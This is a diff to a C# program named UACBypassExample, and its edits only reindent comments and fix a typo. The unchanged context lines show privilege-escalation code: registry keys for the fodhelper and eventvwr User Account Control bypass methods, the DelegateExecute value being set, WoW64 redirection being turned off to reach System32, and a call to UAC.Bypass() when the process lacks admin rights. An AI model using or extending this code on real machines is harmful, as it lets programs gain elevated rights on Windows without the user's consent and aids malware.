@@ -41,17 +41,17 @@ namespace UACBypassExample
         {
              List<UACPath> upath = new List<UACPath>
              {
-		  // FODHELPER METHOD: Windows 10 2016 and up.
+		          // FODHELPER METHOD: Windows 10 2016 and up.
                   new UACPath( "HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\command", "C:\\Windows\\System32\\fodhelper.exe" ), // 0
                   // EVENTVWR METHOD: Windows versions less than Windows 10
-		  new UACPath( "HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command",     "C:\\Windows\\System32\\eventvwr.exe"  )  // 1
+		          new UACPath( "HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command",     "C:\\Windows\\System32\\eventvwr.exe"  )  // 1
              };
 
              IntPtr ov = IntPtr.Zero;
 
              try
              {
-		  // to get the actual version, you need to embed the manifest with a <supportedOS>
+		          // to get the actual version, you need to embed the manifest with a <supportedOS>
                   // entry. Otherwise Environment.OSVersion might return Windows 8 instead of 10.
                   // That entry is created along with the manifest, you just need to remove the comment tag 
                   // <!-- .. --> within the supportedOS entry.
@@ -61,8 +61,8 @@ namespace UACBypassExample
                   if (isWin10up)
                         Registry.SetValue(upath[1].RegPath, "DelegateExecute", "");
                   
-		  // use this if your program is running on 32 bit.
-		  // it is used to prevent redirection to SysWOW64 when trying to access something
+		          // use this if your program is running on 32 bit.
+		          // it is used to prevent redirection to SysWOW64 when trying to access something
                   // on System32, since both fodhelper and eventvwr doesn't even exists there somehow.
                   if (Imports.Wow64DisableWow64FsRedirection(out ov))
                   {
@@ -82,7 +82,7 @@ namespace UACBypassExample
               }
               finally
               {
-		   // Reverting is somewhat important.
+		            // Reverting is somewhat important.
 
                     if (!Imports.Wow64RevertWow64FsRedirection(ov))
                         Console.WriteLine("Failed to revert WoW64FsRedirection.");
@@ -100,7 +100,7 @@ namespace UACBypassExample
              }
              else
              {
-                 // if not, perform a UAC bypaas
+                 // if not, perform a UAC bypass
                  UAC.Bypass();
              }
          }
